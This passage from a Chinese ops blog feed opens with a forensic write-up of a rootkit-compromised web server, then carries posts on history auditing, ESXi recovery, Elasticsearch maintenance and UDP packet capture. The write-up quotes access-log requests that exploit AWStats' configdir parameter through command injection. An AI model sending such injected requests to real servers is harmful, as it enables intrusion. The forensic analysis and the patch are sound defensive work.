寻找攻击源到目前为止，我们所知道的情况是，有个mail帐号曾经登录过系统，但是为何会导致此网站服务器持续对外发送数据包呢？必须要找到对应的攻击源，通过替换到此服务器上的ps命令查看系统目前运行的进程，又发现了新的可疑： 1nobody 22765 1 6 Sep29 ? 4-00:11:58 .t 这个.t程序是什么呢，继续执行top命令，结果如下： 12PID USER PR NI VIRT RES SHR S %CPU %MEM TIME+ COMMAND22765 nobody 15 0 1740m 1362m 1228 S 98.3 91.5 2892:19 .t 从输出可知，这个t程序已经运行了4天左右，运行这个程序的是nobody用户，并且这个t程序消耗了大量的内存和cpu，这也是之前客户反映的网站服务器异常缓慢的原因，从这个输出，我们得到了t程序的进程PID为22765，接下来根据PID查找下执行程序的路径在哪里 进入内存目录，查看对应PID目录下exe文件的信息： 12[root@webserver ~]# /mnt/bin/ls -al /proc/22765/exe lrwxrwxrwx 1 root root 0 Sep 29 22:09 /proc/22765/exe -&gt; /var/tmp/…/apa/t 这样就找到了进程对应的完整程序执行路径，这个路径很隐蔽，由于/var/tmp目录默认情况下任何用户可读性，而入侵者就是利用这个漏洞在/var/tmp目录下创建了一个“…”的目录，而在这个目录下隐藏着攻击的程序源，进入/var/tmp/…/目录，发现了一些列入侵者放置的rootkit文件，列表如下： 123456789[root@webserver ...]#/mnt/bin/ls -aldrwxr-xr-x 2 nobody nobody 4096 Sep 29 22:09 apa-rw-r--r-- 1 nobody nobody 0 Sep 29 22:09 apa.tgzdrwxr-xr-x 2 nobody nobody 4096 Sep 29 22:09 cacadrwxr-xr-x 2 nobody nobody 4096 Sep 29 22:09 haha-rw-r--r-- 1 nobody nobody 0Sep 29 22:10 kk.tar.gz-rwxr-xr-x 1 nobody nobody 0 Sep 29 22:10 login-rw-r--r-- 1 nobody nobody 0 Sep 29 22:10 login.tgz-rwxr-xr-x 1 nobody nobody 0 Sep 29 22:10 z 通过对这些文件的分析，基本判断这就是我们要找的程序攻击源，其中： 1）、z程序是用来清除系统日志等相关信息的，例如执行： 1./z 62.17.163.186 这条命令执行后，系统中所有与62.17.163.186有关的日志将全部被清除掉。 2）、在apa目录下有个后门程序t，这个就是之前在系统中看到的，运行此程序后，此程序会自动去读apa目录下的ip这个文件，而ip这个文件记录了各种ip地址信息，猜想这个t程序应该是去扫描ip文件中记录的所有ip信息，进而获取远程主机的权限，可见这个网站服务器已经是入侵者的一个肉鸡了。 3）、haha目录里面放置的就是用来替换系统相关命令的程序，也就是这个目录下的程序使我们无法看到操作系统的异常情况。 4）、login程序就是用来替换系统登录程序的木马程序，此程序还可以记录登录帐号和密码。 查找攻击原因到这里为止，服务器上遭受的攻击已经基本清晰了，但是入侵者是如何侵入这台服务器的呢？这个问题很重要，一定要找到入侵的根源，才能从根本上封堵漏洞。 为了弄清楚入侵者是如何进入服务器的，需要了解下此服务器的软件环境，这台服务器是一个基于java的web服务器，安装的软件有apache2.0.63、tomcat5.5，apache和tomcat之间通过mod_jk模块进行集成，apache对外开放80端口，由于tomcat没有对外开放端口，所以将问题集中到apache上面。 通过查看apache的配置发现，apache仅仅处理些静态资源请求，而网页也以静态页面居多，所以通过网页方式入侵系统可能性不大，既然漏洞可能来自于apache，那么尝试查看apache日志，也许能发现一些可疑的访问痕迹，通过查看access.log文件，发现了如下信息： 1262.17.163.186 - - [29/Sep/2013:22:17:06 +0800] &quot;GET http://www.xxx.com/cgi-bin/awstats.pl?configdir=|echo;echo;ps+-aux%00 HTTP/1.0&quot; 200 12333 &quot;-&quot; &quot;Mozilla/5.0 (Windows; U; Windows NT 5.1; pt-BR; rv:1.8.1) Gecko/20121010 Firefox/2.0&quot;62.17.163.186 - - [29/Sep/213:22:17:35 +0800] &quot;GET http://www.xxx.com/cgi-bin/awstats.pl?configdir=|echo;echo;cd+/var/tmp/.../haha;ls+-a%00 HTTP/1.0&quot; 200 1626 &quot;-&quot; &quot;Mozilla/5.0 (Windows; U; Windows NT 5.1; pt-BR; rv:1.8.1) Gecko/20121010 Firefox/2.0&quot; 至此，发现了漏洞的根源，原来是awstats.pl脚本中configdir的一个漏洞，通过了解此服务器的应用，客户确实是通过一个Awstats的开源插件来做网页访问统计，通过这个漏洞，攻击者可以直接在浏览器上操作服务器，例如查看进程、创建目录等。通过上面第二条日志可以看出，攻击者正常浏览器执行切换到/var/tmp/…/haha目录的操作。 这个脚本漏洞挺可怕的，不过在Awstats官网也早已给出了修补的方法，对于这个漏洞，修复方法很简单，打开awstats.pl文件，找到如下信息： 12345678910if ($QueryString =~ /configdir=([^&amp;]+)/i)&#123;$DirConfig=&amp;DecodeEncodedString(&quot;$1&quot;);&#125;修改为如下即可：if ($QueryString =~ /configdir=([^&amp;]+)/i)&#123;$DirConfig=&amp;DecodeEncodedString(&quot;$1&quot;);$DirConfig=~tr/a-z0-9_\\-\\/\\./a-z0-9_\\-\\/\\./cd;&#125; 6. 揭开谜团通过上面逐步分析和介绍，此服务遭受入侵的原因和过程已经非常清楚了，大致过程如下： （1）攻击者通过Awstats脚本awstats.pl文件的漏洞进入了系统，在/var/tmp目录下创建了隐藏目录，然后将rootkit后门文件传到这个路径下。 （2）攻击者通过植入后门程序，获取了系统超级用户权限，进而控制了这台服务器，通过这台服务器向外发包。 （3）攻击者的IP地址62.17.163.186可能是通过代理过来的，也可能是攻击者控制的其他肉鸡服务器。 （4）攻击者为了永久控制这台机器，修改了系统默认帐号mail的信息，将mail帐号变为可登录，并且设置了mail帐号的密码。 （5）攻击者在完成攻击后，通过后门程序自动清理了系统访问日志，毁灭了证据。 通过对这个入侵过程的分析，发现入侵者的手段还是非常简单和普遍的，虽然入侵者删除了系统的一些日志，但是还是留下了很多可查的踪迹，其实还可以查看用户下的.bash_history文件，这个文件是用户操作命令的历史记录。 7. 如何恢复网站由于系统已经文件被更改和替换，此系统已经变得完全不可信，因此建议备份网站数据，重新安装系统，基本步骤如下： （1）安装稳定版本的操作系统，删除系统默认的并且不需要的用户。 （2）系统登录方式改为公钥认证方式，避开密码认证的缺陷。 （3）安装更高版本的apache和最新稳定版本的Awstats程序。 （4）使用Linux下的Tcp_Wrappers防火墙，限制ssh登录的源地址。 参考：南非蚂蚁","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"linux","slug":"linux","permalink":"https://garywu520.github.io/tags/linux/"},{"name":"攻击","slug":"攻击","permalink":"https://garywu520.github.io/tags/%E6%94%BB%E5%87%BB/"},{"name":"肉鸡","slug":"肉鸡","permalink":"https://garywu520.github.io/tags/%E8%82%89%E9%B8%A1/"},{"name":"rootkit攻击","slug":"rootkit攻击","permalink":"https://garywu520.github.io/tags/rootkit%E6%94%BB%E5%87%BB/"}]},{"title":"合理利用history功能-Linux","slug":"合理利用history功能-Linux","date":"2019-06-20T03:29:04.000Z","updated":"2019-06-20T03:31:03.779Z","comments":true,"path":"2019/06/20/合理利用history功能-Linux/","link":"","permalink":"https://garywu520.github.io/2019/06/20/%E5%90%88%E7%90%86%E5%88%A9%E7%94%A8history%E5%8A%9F%E8%83%BD-Linux/","excerpt":"Linux下通过history命令查看用户的所有历史操作记录，而这些记录存储在用户目录下的“.bash_history”文件中 1ls -lh .bash_history 默认的history命令只能看到用户历史操作记录，并不能区分用户操作命令的时间，所以就需要进行如下改动：","text":"Linux下通过history命令查看用户的所有历史操作记录，而这些记录存储在用户目录下的“.bash_history”文件中 1ls -lh .bash_history 默认的history命令只能看到用户历史操作记录，并不能区分用户操作命令的时间，所以就需要进行如下改动： cat /etc/bashrc #新增如下条目 1234HISTFILESIZE=4000HISTSIZE=4000HISTTIMEFORMAT=&#x27;%F %T&#x27;export HISTTIMEFORMAT HISTFILESIZE定义了在.bash_history文件中保存命令的记录总数，默认值是1000，这里设置为4000； HISTSIZE定义了history命令输出的记录总数； HISTTIMEFORMAT定义时间显示格式，这里的格式与date命令后的“+”%F %T””是一致的； HISTTIMEFORMAT作为history的时间变量将值传递给history命令。 为了确保安全，保留shell命令执行历史是非常重要的，虽然有history查看历史命令，但功能并非针对审计目的而设计，因此很容易被篡改或丢失。故需要通过下面的shell将 登录过系统的用户、IP地址、shell命令以及详细操作时间等信息保存在一个安全的地方，便于审计与排查。 cat /etc/profile #新增如下代码即可 12345678910111213141516171819#historyUSER_IP=`who -u am i 2&gt;/dev/null| awk &#x27;&#123;print $NF&#125;&#x27;|sed -e &#x27;s/[()]//g&#x27;`HISTDIR=/usr/share/.historyif [ -z $USER_IP ];then USER_IP=`hostname`fiif [ ! -d $HISTDIR ];then mkdir -p $HISTDIR chmod 777 $HISTDIRfiif [ ! -d $HISTDIR/$&#123;LOGNAME&#125; ];then mkdir -p $HISTDIR/$&#123;LOGNAME&#125; chmod 300 $HISTDIR/$&#123;LOGNAME&#125;fiexport HISTSIZE=4000DT=`date +%Y%m%d_%H%M%S`export HISTFILE=&quot;$HISTDIR/$&#123;LOGNAME&#125;/$&#123;USER_IP&#125;.history.$DT&quot;export HISTTIMEFORMAT=&quot;[%Y.%m.%d %H:%M:%S]&quot;chmod 600 $HISTDIR/$&#123;LOGNAME&#125;/*.history* 2&gt;/dev/null 这段代码将每个用户的shell命令执行历史以文件的形式保存在/usr/share/.history目录中，每个用户一个文件夹，并且文件夹下的每个文件以IP地址加shell命令操作时间的格式命名。效果如下： 123456[root@CentOS7 root]# pwd/usr/share/.history/root[root@CentOS7 root]# ls -lh total 4.0K-rw------- 1 root root 333 Jun 20 11:01 10.0.60.251.history.20190620_110057 保存历史命令的文件夹目录要尽量隐蔽，避免被黑客发现后删除。 参考：南非蚂蚁","categories":[],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://garywu520.github.io/tags/Linux/"},{"name":"history","slug":"history","permalink":"https://garywu520.github.io/tags/history/"},{"name":"系统安全","slug":"系统安全","permalink":"https://garywu520.github.io/tags/%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8/"}]},{"title":"邓宁-克鲁格心理效应","slug":"邓宁-克鲁格心理效应","date":"2019-06-14T03:00:12.000Z","updated":"2019-06-14T04:23:40.922Z","comments":true,"path":"2019/06/14/邓宁-克鲁格心理效应/","link":"","permalink":"https://garywu520.github.io/2019/06/14/%E9%82%93%E5%AE%81-%E5%85%8B%E9%B2%81%E6%A0%BC%E5%BF%83%E7%90%86%E6%95%88%E5%BA%94/","excerpt":"邓宁-克鲁格效应(The Dunning-Kruger Effect)**，也称 **达克效应 什么是邓宁-克鲁格效应邓宁-克鲁格效应是指的是能力欠缺的人在自己欠考虑的决定的基础上得出错误结论，但是无法正确认识到自身的不足，辨别错误行为，是一种认知偏差现象。这些能力欠缺者们沉浸在自我营造的虚幻的优势之中，常常高估自己的能力水平，却无法客观评价他人的能力。","text":"邓宁-克鲁格效应(The Dunning-Kruger Effect)**，也称 **达克效应 什么是邓宁-克鲁格效应邓宁-克鲁格效应是指的是能力欠缺的人在自己欠考虑的决定的基础上得出错误结论，但是无法正确认识到自身的不足，辨别错误行为，是一种认知偏差现象。这些能力欠缺者们沉浸在自我营造的虚幻的优势之中，常常高估自己的能力水平，却无法客观评价他人的能力。 邓宁-克鲁格效应的成因1.低能力者的双重困境 Kruger和Dunning (1999)指出，个体在某一特定领域具备能力有两层含义。其一是指个体在此领域中的表现出众，其二是指个体能认识到自己在这一领域的能力水平，这种认知包括对自己以及他人。在某一领域能力低的个体缺乏一种认知心理学家所说的元认知能力。这种能力使个体既能知道自己表现得怎样，也能对自己的能力做出准确的评价。俗语中有“知其然，知其所以然，’，就是指这种元认知能力。低能力者在对自己的能力做出评价时，面临了双重困境，即他们既不能呈现高水平的绩效表现，也无法正确认知到自己的能力低卜，反而还会产生对自己能力的无端自负。 2.元认知能力缺陷理论 该实验说明，元认知能力是个体在某一特定领域客观的能力水平与自我评价之间的一个中介变量。尽管个体能在能力测验中取得好的成绩，但他们仍然无法正确评价自己的能力水平，而那些本身就无法取得能力测验好成绩的人更加无法正确评价自己的能力，这些都是因为他们的元认知能力存在缺陷。 3.虚假一致性效应 虚假一致性是指人们常常会高估或夸大自己的信念、判断及行为的普遍性。能力高的人在能力测试上表现得不错，就错误的估计其他人也是这样的，而对自己能力突出的这一特征并不敏感。在实验中能力排名处在最高端的个体认识到他们后来看到的5份答卷比自己表现得差后，就会调整自己的判断，因而变得更准确。 参考：MBAlib","categories":[],"tags":[{"name":"随笔","slug":"随笔","permalink":"https://garywu520.github.io/tags/%E9%9A%8F%E7%AC%94/"},{"name":"邓宁","slug":"邓宁","permalink":"https://garywu520.github.io/tags/%E9%82%93%E5%AE%81/"},{"name":"克鲁格效应","slug":"克鲁格效应","permalink":"https://garywu520.github.io/tags/%E5%85%8B%E9%B2%81%E6%A0%BC%E6%95%88%E5%BA%94/"}]},{"title":"ESXI vm灾难恢复","slug":"ESXI-vm灾难恢复","date":"2019-06-13T04:13:14.000Z","updated":"2019-06-13T04:16:27.539Z","comments":true,"path":"2019/06/13/ESXI-vm灾难恢复/","link":"","permalink":"https://garywu520.github.io/2019/06/13/ESXI-vm%E7%81%BE%E9%9A%BE%E6%81%A2%E5%A4%8D/","excerpt":"1本案例适用于 ESXI中正在运行的VM文件误删除，当重启vm后提示文件丢失，其他情况仅供参考 操作步骤(1) 在原vm上添加一块和原硬盘大小一致的虚拟硬盘AA [也就是说新AA的vmdk文件需要在原目录] (2)开启SSH服务，并ssh登陆到ESXI (3)找到并cd到原vm目录","text":"1本案例适用于 ESXI中正在运行的VM文件误删除，当重启vm后提示文件丢失，其他情况仅供参考 操作步骤(1) 在原vm上添加一块和原硬盘大小一致的虚拟硬盘AA [也就是说新AA的vmdk文件需要在原目录] (2)开启SSH服务，并ssh登陆到ESXI (3)找到并cd到原vm目录 (4)用vi命令打开这个AA.vmdk文件 将文件中的虚拟快照[参数:RW 104857600 VMFS “AA-flat.vmdk”] 修改为目录中仅存的xx-flat.vmdk 12345678910111213141516171819202122[root@bogon:/vmfs/volumes/5720f606-0b9b3145-22ef-0024e85ee7c5/test-01] cat test-01_2.vmdk # Disk DescriptorFileversion=1encoding=&quot;UTF-8&quot;CID=fffffffeparentCID=ffffffffisNativeSnapshot=&quot;no&quot;createType=&quot;vmfs&quot;# Extent descriptionRW 104857600 VMFS &quot;test-01-flat.vmdk&quot;# The Disk Data Base #DDBddb.adapterType = &quot;lsilogic&quot;ddb.geometry.cylinders = &quot;6527&quot;ddb.geometry.heads = &quot;255&quot;ddb.geometry.sectors = &quot;63&quot;ddb.longContentID = &quot;9b6db9e43aec61e0ad783c0cfffffffe&quot;ddb.uuid = &quot;60 00 C2 9c c0 66 6b 4b-77 46 09 2c b9 89 67 bd&quot;ddb.virtualHWVersion = &quot;11&quot; 同时将此文件名AA.vmdk修改为xx.vmdk 1mv test-01_2.vmdk test-01.vmdk (5) VM中移除新增的磁盘AA 这时候就可以正常重启VM了 注：如果ESXI界面出现启动vm出现错误，就需要重新登录ESXI界面后再操作。","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"ESXI","slug":"ESXI","permalink":"https://garywu520.github.io/tags/ESXI/"},{"name":"VM","slug":"VM","permalink":"https://garywu520.github.io/tags/VM/"},{"name":"虚拟机","slug":"虚拟机","permalink":"https://garywu520.github.io/tags/%E8%99%9A%E6%8B%9F%E6%9C%BA/"},{"name":"虚拟化","slug":"虚拟化","permalink":"https://garywu520.github.io/tags/%E8%99%9A%E6%8B%9F%E5%8C%96/"}]},{"title":"ES关闭分片自动迁移功能","slug":"ES关闭分片迁移功能","date":"2019-06-12T09:51:22.000Z","updated":"2019-06-12T10:03:42.108Z","comments":true,"path":"2019/06/12/ES关闭分片迁移功能/","link":"","permalink":"https://garywu520.github.io/2019/06/12/ES%E5%85%B3%E9%97%AD%E5%88%86%E7%89%87%E8%BF%81%E7%A7%BB%E5%8A%9F%E8%83%BD/","excerpt":"现有的ES集群，不可避免的需要新增或重启节点，正确步骤应该是首先关闭ES集群的reshard功能, 防止分片自动迁移。 Master节点关闭reshard12345curl -XPUT http://server_ip:9200/_cluster/settings -d &#x27;&#123; &quot;transient&quot; : &#123; &quot;cluster.routing.allocation.enable&quot;: &quot;none&quot; &#125;&#125;&#x27; 此时就可以进行节点重启操作了","text":"现有的ES集群，不可避免的需要新增或重启节点，正确步骤应该是首先关闭ES集群的reshard功能, 防止分片自动迁移。 Master节点关闭reshard12345curl -XPUT http://server_ip:9200/_cluster/settings -d &#x27;&#123; &quot;transient&quot; : &#123; &quot;cluster.routing.allocation.enable&quot;: &quot;none&quot; &#125;&#125;&#x27; 此时就可以进行节点重启操作了 维护完，Master节点开启reshard功能12345curl -XPUT http://server_ip:9200/_cluster/settings -d &#x27;&#123; &quot;transient&quot; : &#123; &quot;cluster.routing.allocation.enable&quot;: &quot;all&quot; &#125;&#125;&#x27; 如果安装了Kopf插件，可以很方便的管理ES集群的reshard打开kopf界面，左上角的锁头，点击锁住即为关闭reshard； 锁头打开即为开启reshard","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"ELK","slug":"ELK","permalink":"https://garywu520.github.io/tags/ELK/"},{"name":"elasticsearch","slug":"elasticsearch","permalink":"https://garywu520.github.io/tags/elasticsearch/"},{"name":"ES","slug":"ES","permalink":"https://garywu520.github.io/tags/ES/"},{"name":"shard","slug":"shard","permalink":"https://garywu520.github.io/tags/shard/"},{"name":"reshard","slug":"reshard","permalink":"https://garywu520.github.io/tags/reshard/"}]},{"title":"ES索引删除","slug":"ES索引删除","date":"2019-06-12T09:40:18.000Z","updated":"2019-10-21T07:26:05.365Z","comments":true,"path":"2019/06/12/ES索引删除/","link":"","permalink":"https://garywu520.github.io/2019/06/12/ES%E7%B4%A2%E5%BC%95%E5%88%A0%E9%99%A4/","excerpt":"","text":"生产环境中的ES使用久了，会产生较大的历史数据，而有些数据是根本使用不到的，除了占用大量磁盘空间外，当有节点异常重启后，会导致大量的磁盘io读写，进而导致ES集群瘫痪。因此，就需要定期进行清理。 一、配置禁止使用通配符删除12#设置禁用_all和*通配符来删除，预防数据丢失action.destructive_requires_name: true 二、使用命令-删除索引格式： 12#删除多个索引，中间用“,”分割curl -XDELETE http://ip:9200/index_name1,index_name2 删除单个索引 1curl -XDELETE http://ip:9200/logstash-exc-2018.01.01 三、shell脚本自动删除ES索引脚本123456789101112131415161718192021222324252627282930#!/bin/bashIP=&#x27;xx.xx.xx.xx&#x27;​#获取索引列表到/tmp/indices.listcurl -XGET http://$&#123;IP&#125;:9200/_cat/indices | grep -v .kibana|grep -v .monitoring-es|awk &#x27;&#123;print $3&#125;&#x27;&gt;/tmp/indices.list​#获取列表中的索引时间,输出格式如“2019-10-15”cat /tmp/indices.list|awk -F [-] &#x27;&#123;print $4&quot;-&quot;$5&quot;-&quot;$NF&#125;&#x27;|sort -rn|uniq &gt;/tmp/date.list​#将过期的索引名称输出到文件/tmp/delete_indices.listwhile read LINEdo #把索引时间转换为unix值 indices_unix=`date -d &quot;$&#123;LINE&#125;&quot; +%s` #获取7天前的unix值 day7ago=`date -d &quot;7 day ago&quot; +&quot;%Y-%m-%d&quot;` unix7=`date -d &quot;$&#123;day7ago&#125;&quot; +%s` #如果时间早于7天前，则将unix转换为&quot;yyyy-mm-dd&quot;,并筛选索引到新的文件中 if [ $&#123;indices_unix&#125; -lt $&#123;unix7&#125; ];then grep &quot;`date -d @$&#123;indices_unix&#125; +%Y-%m-%d`&quot; /tmp/indices.list &gt;&gt;/tmp/delete_indices.list fidone &lt; /tmp/date.list​​#清理过期索引while read XLINEdo curl -XDELETE http://$&#123;IP&#125;:9200/$XLINEdone &lt; /tmp/delete_indices.list","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"elasticsearch","slug":"elasticsearch","permalink":"https://garywu520.github.io/tags/elasticsearch/"},{"name":"es","slug":"es","permalink":"https://garywu520.github.io/tags/es/"},{"name":"elk","slug":"elk","permalink":"https://garywu520.github.io/tags/elk/"}]},{"title":"Json数据调用变量问题-Shell","slug":"Json数据调用变量问题-Shell","date":"2019-06-10T08:19:01.000Z","updated":"2019-06-10T08:23:51.364Z","comments":true,"path":"2019/06/10/Json数据调用变量问题-Shell/","link":"","permalink":"https://garywu520.github.io/2019/06/10/Json%E6%95%B0%E6%8D%AE%E8%B0%83%E7%94%A8%E5%8F%98%E9%87%8F%E9%97%AE%E9%A2%98-Shell/","excerpt":"curl提交数据部分如下： 1234567891011curl -XPOST -H &quot;Content-Type: application/json&quot; http://admin.xxx.cn/xxx/AddServer \\-d &#x27;&#123;\\&quot;platform_name&quot;:&quot;$&#123;PLATFORM&#125;&quot;, \\&quot;region_id&quot;:&quot;$&#123;SID&#125;&quot;, \\&quot;game_db_ip&quot;:&quot;$&#123;GAME_DOMAIN&#125;&quot;, \\&quot;game_ip&quot;:&quot;$&#123;GAME_DOMAIN&#125;&quot;, \\&quot;log_db_ip&quot;:&quot;admin.xxx.cn&quot;, \\&quot;server_type&quot;:&quot;3&quot;, \\&quot;server_state&quot;:&quot;1&quot;, \\&quot;main_server&quot;:&quot;0&quot;\\&#125;&#x27; 其中，上面引用的Shell变量没有被解析，主要是引号问题。","text":"curl提交数据部分如下： 1234567891011curl -XPOST -H &quot;Content-Type: application/json&quot; http://admin.xxx.cn/xxx/AddServer \\-d &#x27;&#123;\\&quot;platform_name&quot;:&quot;$&#123;PLATFORM&#125;&quot;, \\&quot;region_id&quot;:&quot;$&#123;SID&#125;&quot;, \\&quot;game_db_ip&quot;:&quot;$&#123;GAME_DOMAIN&#125;&quot;, \\&quot;game_ip&quot;:&quot;$&#123;GAME_DOMAIN&#125;&quot;, \\&quot;log_db_ip&quot;:&quot;admin.xxx.cn&quot;, \\&quot;server_type&quot;:&quot;3&quot;, \\&quot;server_state&quot;:&quot;1&quot;, \\&quot;main_server&quot;:&quot;0&quot;\\&#125;&#x27; 其中，上面引用的Shell变量没有被解析，主要是引号问题。 解决方法： 1234567891011curl -XPOST -H &quot;Content-Type: application/json&quot; http://admin.xxx.cn/zmsgApi/xxx/AddServer \\-d &#x27;&#123;\\&quot;platform_name&quot;:&quot;&#x27;&quot;$&#123;PLATFORM&#125;&quot;&#x27;&quot;, \\&quot;region_id&quot;:&quot;&#x27;&quot;$&#123;SID&#125;&quot;&#x27;&quot;, \\&quot;game_db_ip&quot;:&quot;&#x27;&quot;$&#123;GAME_DOMAIN&#125;&quot;&#x27;&quot;, \\&quot;game_ip&quot;:&quot;&#x27;&quot;$&#123;GAME_DOMAIN&#125;&quot;&#x27;&quot;, \\&quot;log_db_ip&quot;:&quot;admin.xxx.cn&quot;, \\&quot;server_type&quot;:&quot;3&quot;, \\&quot;server_state&quot;:&quot;1&quot;, \\&quot;main_server&quot;:&quot;0&quot;\\&#125;&#x27; 参考自：Jamin Zhang","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"curl","slug":"curl","permalink":"https://garywu520.github.io/tags/curl/"},{"name":"shell","slug":"shell","permalink":"https://garywu520.github.io/tags/shell/"},{"name":"curl -XPOST","slug":"curl-XPOST","permalink":"https://garywu520.github.io/tags/curl-XPOST/"},{"name":"shell变量","slug":"shell变量","permalink":"https://garywu520.github.io/tags/shell%E5%8F%98%E9%87%8F/"},{"name":"json引用","slug":"json引用","permalink":"https://garywu520.github.io/tags/json%E5%BC%95%E7%94%A8/"}]},{"title":"UDP抓包工具tcpdump","slug":"UDP抓包工具tcpdump","date":"2019-06-05T04:11:51.000Z","updated":"2019-06-05T04:29:55.538Z","comments":true,"path":"2019/06/05/UDP抓包工具tcpdump/","link":"","permalink":"https://garywu520.github.io/2019/06/05/UDP%E6%8A%93%E5%8C%85%E5%B7%A5%E5%85%B7tcpdump/","excerpt":"前言Vultr.com 提供的VPS一直是GFW打压的重灾区，Vultr提供的VPS 无论哪个区域节点，TCP协议基本都被阻断；唯一相对较好的方法是使用UDP，这是因为UDP特性是基于无连接协议。但是每逢“重大节日”，都会被GFW特殊照顾，GFW对付UDP协议的方法就是Qos, 即定时不定时的将UDP包给丢弃。 关于测试工具123456789可使用TCPdump工具进行查看数据包流向情况VPS网络-服务端：$ tcpdump host 1.10.18.222 [查看VPS网络接收或发送到1.10.18.222主机的UDP数据包] 本地网络-客户端：$ tcpdump -i eth0 port 1024 and dst host &quot;xx.xx.xx.xx&quot; [查看本地网络通过eth0端口发送到xx.xx.xx.xx主机1024端口的数据包]","text":"前言Vultr.com 提供的VPS一直是GFW打压的重灾区，Vultr提供的VPS 无论哪个区域节点，TCP协议基本都被阻断；唯一相对较好的方法是使用UDP，这是因为UDP特性是基于无连接协议。但是每逢“重大节日”，都会被GFW特殊照顾，GFW对付UDP协议的方法就是Qos, 即定时不定时的将UDP包给丢弃。 关于测试工具123456789可使用TCPdump工具进行查看数据包流向情况VPS网络-服务端：$ tcpdump host 1.10.18.222 [查看VPS网络接收或发送到1.10.18.222主机的UDP数据包] 本地网络-客户端：$ tcpdump -i eth0 port 1024 and dst host &quot;xx.xx.xx.xx&quot; [查看本地网络通过eth0端口发送到xx.xx.xx.xx主机1024端口的数据包] 关于GFW Qos样本(1)本地网络[客户端]TCPDump数据： 12345678911:49:15.945137 IP bogon.44919 &gt; *.vultr.com.1024: UDP, length 135011:49:15.945144 IP bogon.44919 &gt; *.vultr.com.1024: UDP, length 135011:49:15.945151 IP bogon.44919 &gt; *.vultr.com.1024: UDP, length 135011:49:15.945167 IP bogon.44919 &gt; *.vultr.com.1024: UDP, length 135011:49:15.945174 IP bogon.44919 &gt; *.vultr.com.1024: UDP, length 135011:49:15.945200 IP bogon.44919 &gt; *.vultr.com.1024: UDP, length 135011:49:15.945218 IP bogon.44919 &gt; *.vultr.com.1024: UDP, length 1350特点：特点：只要有请求，本地网络代理服务会一直向目标主机发送UDP数据包 (2)VPS网络[服务端]TCPDump数据： 正常情况 - 数据有去有回 123456789101112131415161718192011:50:11.359508 IP *.vultr.com.1024 &gt; 1.10.18.222.44919: UDP, length 10811:50:11.359612 IP *.vultr.com.1024 &gt; 1.10.18.222.44919: UDP, length 6011:50:11.673463 IP 1.10.18.222.44919 &gt; *.vultr.com.1024: UDP, length 5211:50:11.682599 IP 1.10.18.222.44919 &gt; *.vultr.com.1024: UDP, length 5211:50:11.682632 IP 1.10.18.222.44919 &gt; *.vultr.com.1024: UDP, length 5211:50:12.441615 IP 1.10.18.222.44919 &gt; *.vultr.com.1024: UDP, length 6011:50:12.465222 IP *.vultr.com.1024 &gt; 1.10.18.222.44919: UDP, length 5211:50:12.928854 IP *.vultr.com.1024 &gt; 1.10.18.222.44919: UDP, length 8411:50:12.928931 IP *.vultr.com.1024 &gt; 1.10.18.222.44919: UDP, length 6011:50:13.252514 IP 1.10.18.222.44919 &gt; *.vultr.com.1024: UDP, length 5211:50:13.280247 IP *.vultr.com.1024 &gt; 1.10.18.222.44919: UDP, length 6011:50:13.496401 IP 1.10.18.222.44919 &gt; *.vultr.com.1024: UDP, length 61411:50:13.521806 IP *.vultr.com.1024 &gt; 1.10.18.222.44919: UDP, length 5211:50:13.602974 IP 1.10.18.222.44919 &gt; *.vultr.com.1024: UDP, length 5211:50:13.855926 IP 1.10.18.222.44919 &gt; *.vultr.com.1024: UDP, length 6011:50:13.883914 IP *.vultr.com.1024 &gt; 1.10.18.222.44919: UDP, length 52............ 被GFW Qos的异常情况 - 数据单向发送UDP 1234567891011:50:11.359508 IP *.vultr.com.1024 &gt; 1.10.18.222.44919: UDP, length 10811:50:11.359612 IP *.vultr.com.1024 &gt; 1.10.18.222.44919: UDP, length 6011:50:11.359508 IP *.vultr.com.1024 &gt; 1.10.18.222.44919: UDP, length 10811:50:11.359612 IP *.vultr.com.1024 &gt; 1.10.18.222.44919: UDP, length 6011:50:11.359508 IP *.vultr.com.1024 &gt; 1.10.18.222.44919: UDP, length 10811:50:11.359612 IP *.vultr.com.1024 &gt; 1.10.18.222.44919: UDP, length 60............ 如果Qos限制过高情况下，服务端会看到TCPDump不再输出任何信息…… 此时可以说明，客户端发送的所有UDP数据包，都被GFW Qos丢弃，服务端这边根本没有收到","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"udp","slug":"udp","permalink":"https://garywu520.github.io/tags/udp/"},{"name":"tcpdump","slug":"tcpdump","permalink":"https://garywu520.github.io/tags/tcpdump/"},{"name":"udp抓包","slug":"udp抓包","permalink":"https://garywu520.github.io/tags/udp%E6%8A%93%E5%8C%85/"},{"name":"udp代理","slug":"udp代理","permalink":"https://garywu520.github.io/tags/udp%E4%BB%A3%E7%90%86/"},{"name":"GFW","slug":"GFW","permalink":"https://garywu520.github.io/tags/GFW/"}]},{"title":"UDP Ping工具","slug":"UDP-Ping工具","date":"2019-06-04T09:22:27.000Z","updated":"2019-06-04T09:24:43.035Z","comments":true,"path":"2019/06/04/UDP-Ping工具/","link":"","permalink":"https://garywu520.github.io/2019/06/04/UDP-Ping%E5%B7%A5%E5%85%B7/","excerpt":"服务端-配置(1) 安装socat 1yum install -y socat (2) 防火墙开启udp 12213端口 12iptables -A INPUT -p udp --dport 12213 -j ACCEPT iptables -A OUTPUT -p udp --sport 12213 -j ACCEPT","text":"服务端-配置(1) 安装socat 1yum install -y socat (2) 防火墙开启udp 12213端口 12iptables -A INPUT -p udp 